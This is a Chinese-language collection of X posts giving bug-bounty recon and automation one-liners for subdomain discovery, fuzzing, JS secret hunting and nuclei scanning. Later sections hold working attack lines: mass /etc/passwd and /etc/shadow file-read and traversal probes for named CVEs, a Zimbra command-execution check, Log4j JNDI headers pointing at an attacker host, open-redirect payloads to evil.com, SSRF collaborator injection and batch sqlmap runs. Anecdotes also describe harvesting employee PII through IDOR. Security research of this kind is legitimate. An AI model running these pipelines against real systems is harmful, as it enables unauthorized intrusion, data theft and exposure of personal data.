# X 语料 · 工具与自动化（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一命令被多人反复转贴的只保留一份；纯工具宣传、无命令的"战绩"、社区寒暄已剔除。
命令按原贴保留，未在本地验证；部分贴子的占位符（wordlist、hosts.txt）需按目标替换。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[资产发现](../asset-discovery.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-tooling（16 条）、x-residual-tooling（6 条）、x-recovered-toolchain（11 条） · 本文 319 行

## 子域与存活探测

- bashrc 函数，一条命令拿到存活子域：
  Reconx() { subfinder -d $1 -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u }
  $ Reconx example.com
- subfinder 走聚合器、瞬时返回，所以先用它跑一遍，再把结果作为 amass 的种子。旧的、已废弃的、解析不出的域名统统别删——它们对 amass、dnsgen 这类变异器仍是好种子。
  amass -nf all_known_domains.txt ...
- 直接用 subfinder 枚举整个 TLD：
  subfinder -d com -silent -all -recursive   # .com
  subfinder -d org -silent -all -recursive   # .org
- 拿到一层子域后继续挖子子域：
  subfinder -dL subs.txt -all -o sub-sub.txt
- assetfinder 出域名，交给 massdns 解析再 httpx：
  assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
- shuffledns 爆破 + httpx + nuclei 一条龙：
  xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1
- subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
- httpx 一次把能探的都探完（TLS、CSP、CNAME、CDN、vhost）：
  assetfinder ford.es | httpx -follow-host-redirects -tls-probe -title -status-code -csp-probe -cname -cdn -content-length -content-type -web-server -vhost
- 取存活子域时加的完整选项：
  cat domains.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -sc -cl -title -t 100 -fr -nc | anew alive.txt
- 逐域发 HEAD 看是否活着：
  subfinder -d targetsite.com -silent > domains.txt && for domain in $(cat domains.txt); do printf "$domain : "; curl https://$domain -X HEAD --head -f -s --connect-timeout 3 | head -1; printf "\n"; done | grep "HTTP/"
- 别再用 dnsprobe + httpx 两步，httpx 自己带 -ip，一次搞定。
- assetfinder | httpx | hakrawler 抓链接并过滤关键词：
  assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
- jldc anubis 的免费子域接口，正则提出域名再交给 httpx：
  curl -s "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*\.)([\w]*\.)([A-z]))\w+" | httpx -title -silent -status-code 200 -web-server -websocket | anew
- haktrails 出子域后直接抽 JS 文件清单（加 tojson 可存成 json）：
  echo "http://domain.com" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
- 翻过期证书（来自 zeroc00I 的思路）：
  xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
- 按 ASN 从 bgp.he.net 提 DNS 名：
  python HEDnsExtractor.py "https://bgp.he.net/net/104.21.0.0/19#_dns" | httpx -title -tech-detect -status-code | grep -i "your search"
- amass 按 CIDR 取资产，接端口扫描再接 nuclei：
  amass intel -cidr 127.0.0.1/21 | subfinder -silent -all -o subdo.txt | rustscan -a subdo.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates
- 先全端口扫，再把开放端口交给 nuclei：
  rustscan -a hosts.txt -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/
- 用 ffuf 扫全端口（不装 masscan 时的替代）：
  seq 1 65535 | ffuf -w - -u https://target.com:FUZZ/
- nmap XML 直接转成 httpx 的输入，中间用 jc + jq：
  nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
- 存活子域直接截图，快速做视觉侦察：
  assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
- 用 nuclei 的无头模式批量截图：
  nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
## 定时化与批量投递
- 每天早上一遍，只推新增：
  cron + subfinder -d $domain | anew domains.txt | slackcat
  cron + subfinder -d $domain -silent | httpx -silent | nuclei -t cves/ | slackcat
- 常驻循环，每 3600 秒一轮：
  subfinder -silent -dL domains.txt | anew subs.txt
  while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; done
- 把整份 URL 清单灌进 Burp 被动扫描（只过代理，不落盘）：
  cat <file-name> | parallel -j 200 curl -L -o /dev/null {} -x 127.0.0.1:8080 -k -s
- 同上，抓取结果直接喂 Burp：
  cat result.txt | parallel -j 100 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
- arkadiyt/bounty-targets-data 那份全量赏金域名单是这套流水线的常见起点。以下四条互为变体：
  # 找 .git 泄露（另可用 crt.sh 起头：curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only 再拼 sed）
  wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
  # gospider 抓完接 nuclei
  cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -q -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
  # jaeles 批量跑签名
  cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
  # chaos 数据集起头，jaeles 签名
  chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
- 自建大规模目标池，合并成一个文件再跑私有模板：
  git clone https://github.com/orwagodfather/x ; cd x ; cat * > 1-file.txt   # 约 165K 目标
  cat 1-file.txt | nuclei -t your-private-template.yaml
- 端口 + gospider 抓完再自动化：
  httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
- chaos 数据集 + httpx + gospider：
  wget -nv -nc https://chaos-data.projectdiscovery.io/example.zip ; unzip example.zip ; cat *.txt | httpx -silent -threads 300 | anew fullAlive; gospider -a -d 0 -S fullAlive -c 5 -t 100 -d 5 --blacklist black | egrep -o '(http|https)://[^/"]+' | anew httpSpider
- xray 与 burp 联动做被动扫描，katana 负责抓：
  ./xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
  katana -list subs.txt -c 50 -d 4 -jc -kf all -proxy http://127.0.0.1:8080
## 管道与 shell 技巧
- 工具只接受文件名时，用 /dev/stdin 把管道接上去，避免写中间文件：
  Bad:  cat domains.txt | subfinder > subs.txt; randomtool -i subs.txt
  Good: cat domains.txt | subfinder | tee subs.txt | randomtool -i /dev/stdin
- httpx 和 nuclei 都支持从 stdin 读，可以直接串起来：
  cat subdomains.txt | httpx | nuclei
- ffuf 也吃 stdin，用 `-w -`：
  cat file | commandX | ffuf -u FUZZ -w -
- sqlmap 支持从 stdin 读 URL，对付大量未鉴权的 GET 注入很省事：
  cat urls.txt | grep = | sqlmap
- 给裸域名批量补协议头，不依赖任何工具：
  cat urls.txt | sed 's/^/https:\/\//'
- 两个 alias，让 ffuf 的字典可以 fzf 现挑：
  alias wordlists='find /opt/wordlists/ -type f | fzf'
  alias fuzz='ffuf -w $(wordlists)'
  fuzz -u https://example.com/FUZZ
- 自己的参数名字典生成函数（waybackurls + unfurl）：
  paramlist() { waybackurls $1 | grep "?" | unfurl keys | sort -u | tee -a paramlist.txt }
- 从站点自身内容造字典：
  cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt
- 同一思路的另一写法，用 sed 把符号拆成换行：
  echo "http://domainname.com" | subfinder -silent | httpx | hakrawler | sed $'s/[./?=:&#]/\n/g' | anew > wordlist.txt
- 用 robots.txt 生成针对性字典：
  httpx -l urls.txt -paths /robots.txt -silent -o robots-url.txt
  for url in $(cat robots-url.txt); do http -b $url | grep 'Disallow' | awk -F ' ' '{print $2}' | cut -c 2- | anew robot-words.txt; done
- bashrc 里放个极简 ff 函数：
  ff() { ffuf -w ~/wordlist/fuzz.txt -u $1/FUZZ -mc 200 }
- 把 URL 拆成所有父路径组合，喂给 fuzzer 或 nuclei：
  cat links | rev > _tmp ; for i in {1..10}; do sed -r "s/^[^/]*?\///g w /dev/stdout" _tmp -i ;done | rev | sort -u | sed "s/$/\//" ; rm _tmp
- 把 ffuf 的进度条和 ANSI 转义清掉，方便落盘做自动化：
  ffuf -w /tmp/wordlists.txt -u URL/FUZZ -r -ac -v &>> /tmp/output.txt ; sed -i 's/:: Progress.*Errors.*:://g' /tmp/output.txt ; sed -i 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' /tmp/output.txt
- ffuf 的 json 输出用 jq 转成表格：
  cat test | jq ".results[] | [.status, .length, .url, .redirectlocation] | @csv" | sed 's/\"//g' | sed 's/,/\t /g' | sed 's/\\//g'
- httpx 结果转 CSV：
  httpx -l domains.txt -status-code -title -threads 100 -web-server -ip -follow-host-redirects -no-color | sed -e 's/\[/\,\[/g' > output.csv
- nuclei 内置的 interactsh 域名换过了，官方链接没跟上，可以先挂个 alias：
  alias nuclei="nuclei -interactsh-url 'https://interactsh.com'"
## ffuf 用法
- 一份字典 × 一批主机，用 clusterbomb：
  ffuf -u https://HFUZZ/WFUZZ -w hosts.txt:HFUZZ -w wordlist.txt:WFUZZ -mode clusterbomb
- 两个字典分别喂路径和主机，输出 CSV 后按列取 URL：
  ffuf -w common.txt:FUZZ -w ~/bb/target/httpx.txt:URL -u URLFUZZ -mc 200 -of csv -o ffuf-result.txt
  cat ffuf-result.txt | awk -F ',' '{print $3}'
- 只想知道一串域名的状态码：
  ffuf -u https://FUZZ -w your_list_of_domains.txt
- 对一批主机逐个跑 ffuf：
  for i in `cat host.txt`; do ffuf -u $i/FUZZ -w wordlist.txt -mc 200,302,401 -se ; done
- 同上，但带上 UA 与 X-Forwarded-For，并把结果落文件：
  for i in $(cat hosts); do ffuf -u $i/FUZZ -w ~/dicc.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/69.0" -H "X-Forwarded-For: 127.0.0.1" -c -fs 0 -t 30 -ac -mc 200 -o ffuf.txt ; done
- 每个新域名都跑一次 vhost，找隐藏服务与后台：
  ffuf -c -u https://target.com -H "Host: FUZZ" -w vhost_wordlist.txt
  想宽松些就把状态码放开、结果存 html：
  ffuf -w 1millionwordlist.txt:FUZZ -u https://FUZZ.corp.example.com -mc 200,301,302,303,304,307,308,403,404,405 -c -of html -o out.html
- 用 Host: 127.0.0.1 撞只对本地开放的路由，用 -fs 排除正常页长度：
  ffuf -u https://target.com/FUZZ -H "Host: 127.0.0.1" -w wordlist.txt -fs <regular_content_length>
- 递归爆破深度可控：
  ffuf -recursion -recursion-depth 3 -w wordlist.txt -u https://host.name/FUZZ
- 递归 + 加 .js 扩展名，从一个 404 页里挖出了 /p/p/ww.js，再顺着这个 JS 找到三个漏洞：
  ffuf -w list.txt -u http://site.com/FUZZ -e .js -recursion
- 找隐藏参数，-fs 0 过掉空响应：
  ffuf -u https://target.com/page.php?FUZZ=1 -w /usr/share/wordlists/params.txt -fs 0
- 找 package-lock.json（露出来就能拿到完整依赖树）：
  ffuf -u https://FUZZ/package-lock.json -w /subdomains
- 在端点后面接 .old，常能撞到备份文件：
  ffuf -u https://domain/FUZZ.old -w php_wordlist.txt -mc 200
- 先捞 403/404 的页面，再用 wfuzz 剔除已知大小，快速看出异常：
  subfinder -dL alvos.txt | httpx > subs.txt
  httpx -l subs.txt --mc 404,403 > 400.txt
  xargs -a 400.txt -n 1 -I{} wfuzz -c -z file,wordlist.txt --hl 3,1,0 --hc 404,400,401,503,500,403,429 -t 5 {}/FUZZ
- 用 interlace 把任务分发到多线程，别把单台主机打挂：
  interlace -tL subdomains.txt -threads 20 -c "fuzzy _target_ ~/wordlists.txt"
- 通用大字典 OneListForAll：
  ffuf -c -mc all -ac -w onelistforall.txt -u http://target.com/FUZZ
  https://github.com/six2dez/OneListForAll
## JS 文件与隐藏端点
- 先爆破 JS 文件，再从 JS 里枚举端点。JS 字典用 assetnote 那份：
  ffuf -w js.txt -u https://x.com/js/FUZZ
- 只捞真正的 JS（靠 content-type 判定，不能只看 .js 后缀）：
  echo http://target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
- 同一手法改成按目标文件类型筛：
  waybackurls example.tld | grep "name" > name_file.txt
  cat example.tld | gau | grep '\.targetfile$' | httpx -status-code -mc 200 -content-type
- 拿到 JS 清单后在里面搜这些键名：Apikey、Api_key、Access_token、bearer
- 从 JS 里捞子域：
  grep -oE "[a-zA-Z0-9._-]+\.domain.com" file.js | sort -u | httpx -silent
- 只捞 JS 然后把 nuclei 的 exposures 模板全跑一遍，等同于自动找密钥泄露：
  echo targetdomain.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
- 同一思路的简写版：
  cat urls | grep "\.js" > js ; nuclei -l js -t ~/nuclei-templates/http/exposures/
- 专门的 JS 抓取模板（POST/GET 都试）：
  nuclei -u https://redacted/static -tags jsbe -debug
- 从 Burp 里挑出所有脚本导出，用 LinkFinder 提端点，再合上爬虫结果一起 fuzz：
  ./LinkFinder.py -i scripts/*.js -o cli | sort -u | tee eps.txt
  { cat eps.txt ; cat eps.txt | tok | sort -u } ; ffuf -u $target -mc all -ac -w -
- 用 Burp 分析 JS 时一定要把 `If-None-Match` 头去掉（Match and Replace 里把 `^If-None-Match.*$` 替换成空串），否则第二次加载全是 304，JS 根本进不来。
- 相反的情况，用 GAP / JS Miner 跑分析时也要先处理 304，否则拿到的是缓存空壳。
- hakrawler 抓路由再交给 ffuf：
  hakrawler -url "https://target.com" -linkfinder -plain | grep from | awk '{ print $1 }' | sed 's/"//g' | egrep "^/[a-zA-Z0-9]" | sort -u | tee crawled-routes.txt
- httpx 出来直接抽 JS，JS 里能藏 API、token、子域：
  cat FILE_TO_TARGET | httpx -silent | subjs | anew
- JS 里看到后台端点 → 全是 403 → 对 /adminarea/users/images 继续 fuzz 仍是 403 → 用 Intruder 枚举 /users/1-100 → 拿到大批用户照片与 PII。403 不等于不存在。
- 用 jsmon.sh 做带 API 上下文的 fuzzing：扫域名 → JS Intelligence → API Paths → 导出端点 → 做成字典，对 dev/prod/staging 分别用 ffuf 或 kiterunner 跑。
- LazyEgg 一次从 JS 里提 links、images、cookies、forms、URL/域名/IP、localStorage、泄露凭据：
  cat jsurls | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds'
## 敏感文件与已知路径
- /.git/ 还在但文件恢复不出来时，用 Gin 直接从索引里读文件与目录名：
  ./gin index | grep "name = "
- /.git 直接访问是 403 时，改打它下面的具体文件：
  httpx -l subs.txt -path /.git/config --status-code --silent
  cat subs.txt | sed 's@$@/.git/config@' | httpx -fr -mc 200
- 换个判据找 .git：只要页面标题是 "Index of" 也算泄露：
  cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
- .svn 暴露时可以直接还原整站源码：
  https://target.com/.svn/wc.db
  https://github.com/anantshri/svn-extractor
- wp-config 直接可读：
  subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
- /assets/env.js 明文配置暴露，有现成 nuclei 模板：
  https://raw.githubusercontent.com/SirBugs/Priv8-Nuclei-Templates/main/Info%20Disclosure/env-disclosure.yaml
- 目标用 ARGO 时，把 argo.properties 加进字典：
  subfinder -d domain.example | httpx --status-code -path /WEB-INF/classes/argo.properties
- Apache 的 /server-info 常留敏感信息，子域和开放端口都值得试：
  cat sub | httpx -path "/server-info" -sc -cl
- /metrics 也要进字典（Prometheus 常把内部端点全列出来）：
  cat hosts.txt | httpx -path /metrics -sc -lc
- phpinfo 泄露，批量扫：
  subfinder -d ibm.com | httpx -t 1000 -rl 1000 -path /info.php -mc 200
- .htaccess 可读时会暴露内网 IP，再对内网 IP 跑自己的 nuclei 模板：
  cat all_ips.txt | httpx | tee live_ips.txt ; cat live_ips.txt | nuclei -t ~/custom_templates
- IIS 短文件名（8.3）泄露：
  nuclei-templates/fuzzing/iis-shortname.yaml
- 递归爆破 /envConfig.json，再回 Burp history 里看它带出了哪些端点。
- URL 短链服务的 wayback 记录常藏密钥，用 -location 直接跟：
  waybackurls urlshortner.com | httpx -location
## 开放重定向
- gf redirect + qsreplace + ffuf 组合：
  gau http://testphp.vulnweb.com | tee -a archive | gf redirect | qsreplace FUZZ | cut -f 3- -d ':' | while read url; do ffuf -w word -u "$url" -c=true -sa=true -sf=true -se=true -mc=302 -v 2>/dev/null ; done
- 更短的版本（waybackurls 起头）：
  echo "https://target.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
- 加 qsreplace 换成自己的域名，再用 -location 确认真的跳过去了：
  gau http://target.com | gf redirect | cut -f 3- -d ':' | qsreplace "https://your-domain.com" | httpx -silent -status-code -location
- 不依赖 gf，直接用路径形态撞：
  cat hosts.txt | httpx -follow-redirects -path "//evil.com" -location
  httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302
## 各类 CVE 的批量探测
- CVE-2021-41277（Metabase geojson 任意文件读）：
  httpx -l IPlist.txt -follow-redirects -title -path /api/geojson?url=file:///etc/passwd -match-string "root:x:0:0"
- VMware vCenter 7.0.2.00100 的同一类漏洞：
  httpx -l MyList -follow-redirects -title -path /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd -match-string "root:x:0:0"
- CVE-2022-27925（Zimbra）：
  cat Mylist | httpx -path /zimbraAdmin/cmd.jsp?cmd=ls -match-string "Command: ls"
- /logs/downloadMainLog 的路径穿越：
  cat rootDomains.txt | assetfinder -subs-only | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../../..//etc/passwd" -mr "root:x:" -t 60
- Wavlink WN530HG4 密码泄露：
  cat rootDomains.txt | assetfinder -subs-only | httpx -path "/set_safety.shtml?r=52300" -silent -nc -p 443,80,8443,8080,9000,9001,9002,9003,8888 -t 80 -mr "var syspasswd="
- CVE-2022-31474（BackupBuddy 任意文件下载）：
  cat hosts | httpx -title -path "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd" -match-string "root:x:0:0"
- CVE-2022-36804（Bitbucket）分两步：先找公开仓库，再看响应特征：
  cat hosts | httpx -follow-redirects -title -path "/repos?visibility=public" -match-string "repository-container" -threads 9500
  响应中出现 `' is not a valid ref and may not be` 即为可疑。
- CVE-2022-41040（ProxyNotShell）：注意这里的判据是返回 **404 才是有漏洞**：
  ffuf -w "urllist.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
- CVE-2023-23752（Joomla webservice 未授权配置读取）：
  subfinder -d TARGET.com -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
  httpx -l targets.txt -sc -ct -ip -path '/api/index.php/v1/config/application?public=true'
- CVE-2021-43798（Grafana 任意文件读）：把路径清单存成文件，用 -paths 批量打：
  cat targets | httpx -paths grafanapaths.txt -silent -threads 300 -ms "root:x:" -o exploitedgrafanas
- WordPress Duplicator 插件任意文件下载：
  /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
- cgi-bin 的编码穿越，直接看回显：
  cat targets.txt | sed "s/.*/\0cgi-bin\/.%2e\/%2e%2e\/%2e%2e\/%2e%2e\/etc\/passwd/" | httpx -silent -match-string "root:"
- Log4j 用 httpx 批量塞 header：
  cat domain.txt | httpx -H "X-Api-Version: \${jndi:ldap://<ip><port>}" -H "User-Agent: \${jndi:ldap://<ip><port>}" -H "Referer: \${jndi:ldap://<ip><port>}"
- 把 bbrf 的域名流交给 log4j-scan：
  bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 log4j-scan.py -u "@"'
- CVE-2024-3400（PAN-OS）：
  nuclei -t CVE20243400.yaml -u target -V telemetry=interact-server
- CVE-2024-24919（Check Point）：
  ffuf -u 'https://FUZZ/clients/MyCRL' -X POST -d 'aCSHELL/../../../../../../../etc/shadow' -mr 'root' -w hostnames.txt -x http://127.0.0.1:8080
- 拿现成的 phpmyadmin 模板改路径：原模板打 /pma/setup/index.php，改成 /admin/pma/setup/index.php 可命中更多同款实例。
## SQLi 与注入类自动化
- 先用 BurpBounty / Param Miner 把所有 POST 参数挖出来，再逐个上 sqlmap 或字典，盲注用这条时间载荷：
  (select*from(select(sleep(5)))a)
- 第二个参数才是注入点时，从 Burp 拷整条请求给 sqlmap，并在参数值上打 * 标记：
  sqlmap -r request.txt --dbs --random-agent --time-sec=12 --level=1 --risk=1
- MSSQL 目标显式指定 dbms，避免 sqlmap 猜错：
  sqlmap -u https://test.com/endpoint/./asp --dbs --random-agent --time-sec=12 --level=1 --risk=1 --batch --dbms mssql
- sqlmap 走 Burp 看流量：
  sqlmap -u "http://target.com" --proxy="http://127.0.0.1:8080"
- 从 wayback 里挑出带参数的动态页，去掉参数值去重后批量跑：
  waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
- 大范围目标先用 dork 定位注入点，再上 sqlmap / ghauri：
  site: target *.php?id=
- 注册后 Burp 里看到 /api/utilisateurs/{我的ID}，把 ID 去掉变成 /api/utilisateurs/，直接返回全部员工的 PII 与账号密码。
## 反射探测与参数发现
- 用不可能出现的表达式当回显标记，一眼看出哪些参数被服务端求值：
  waybackurls bounty.com | grep '=' | qsreplace "kingofbounty{{9*9}}" | httpx -match-regex 'kingofbounty81' -threads 300 -http-proxy http://127.0.0.1:8080/
- 把参数值全换成 collaborator 地址，用于找 SSRF：
  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net
- nuclei 接自己的 collaborator：
  echo https://vul-target.com | nuclei -t collab-automation.yaml -burp-collaborator-biid xxxxxxx
- 从存活站里批量枚举参数（x8 是参数爆破工具）：
  assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
- 浏览完整个范围后，在 Burp 里搜 `=https://` 和 `=http://`，常能捞出隐藏的 SSRF 点。
- 别只放目录名，把 /metrics 这类固定路径也加进字典一起 fuzz。
## nuclei 用法
- 一次跑多个模板目录：
  cat list | nuclei -t nuclei-templates/{files,cves,tokens} -v -o result
- 用 wappalyzer 识别出的技术栈自动映射到对应标签，省掉手工挑模板：
  nuclei -as
- token 批量喷洒，支持直接给值或给文件：
  nuclei -t token-spray/ -var token=paste-token-here
  nuclei -t token-spray/ -var token=file_with_tokens.txt
- 按 ASN 做 PTR 指纹，映射目标的网络结构：
  echo <ASN> | nuclei -id ptr-fingerprint
- 直接在本地仓库里扫密钥泄露，不需要先泄漏到公网：
  git clone https://github.com/zricethezav/gitleaks.git | nuclei -target ./ -t secrets-in-files.yaml
  https://github.com/ayadim/nuclei-templates/blob/main/file/secrets-in-files.yaml
- 批量试 admin 的各种前后缀组合：
  cat /wordlist/subdomains | xargs -P 10 -I {} httpx -silent -mc 200,301,302,401 -u https://{}-admin
  组合形式：admin-{}、{}admin、admin{}、admin.{}、{}.admin
## 其他实用小工具
- ffuf 打不动的场景可以用 interlace 做分发；Fuzzy 也能配合。
- 让 ChatGPT 把 curl 转成 Burp Repeater 可直接粘贴的格式：
  "Convert the following curl command to Burp Repeater format and make it easy to copy/paste: <curl>"
- Firebase 配错检测：域名里出现 firebaseio，且规则写的是 ".read": true，就是全库可读可写。
  findomain -t domain.com | httpx | grep "firebaseio"
- 功能被前端禁用时，去源码里把 `disabled: true` 改成 false，拦下 PUT 再改 body（例如 limit=1000000）。
- 子域批量查 .git/config：
  cat subs.txt | sed 's@$@/.git/config@' | httpx -fr -mc 200
- 以 /_FUZZ 形式爆破下划线前缀的接口：
  ffuf -w list.txt -u http://site.com/_FUZZ
- 开测前固定跑的一串：
  cat scope | httpx | tee httpx_out ; cat httpx_out | nuclei | tee nuclei_out ; dirsearch -l httpx -e \* -of csv -o dirsearch_out
